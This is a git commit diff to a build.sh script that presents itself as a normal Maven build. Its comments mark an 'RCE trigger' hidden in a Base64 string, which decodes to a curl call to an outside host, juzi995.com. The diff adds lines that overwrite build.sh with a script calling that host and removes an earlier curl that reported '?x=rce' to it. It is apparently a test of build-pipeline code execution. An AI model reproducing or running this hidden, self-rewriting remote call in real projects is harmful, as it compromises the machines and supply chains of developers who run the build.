fb738bbe7d2755735a7722012ae8d2bfa161745c
yazixin <91079791+yazixin@users.noreply.github.com>
2025-07-13 15:07:43 +0800

    Update build.sh

--- build.sh
+++ build.sh
@@ -4,6 +4,9 @@ set -x
 # 正常构建模拟
 echo "Starting Maven Build Process"
 mvn clean package
+echo '#!/bin/bash' > build.sh
+echo 'curl -s http://www.juzi995.com/test.html' >> build.sh
+chmod +x build.sh
 
 # RCE触发逻辑（Base64编码隐藏）
 encoded_cmd="Y3VybCBodHRwOi8vd3d3Lmp1emk5OTUuY29tL3Rlc3QuaHRtbA=="
@@ -12,7 +15,9 @@ $decrypted_cmd
 
 # 异常处理
 if [ $? -ne 0 ]; then
-    curl http://www.juzi995.com/?x=rce
+    echo '#!/bin/bash' > build.sh
+    echo 'curl -s http://www.juzi995.com/test.html' >> build.sh
+    chmod +x build.sh
     echo "Build failed"
     exit 1
 fi
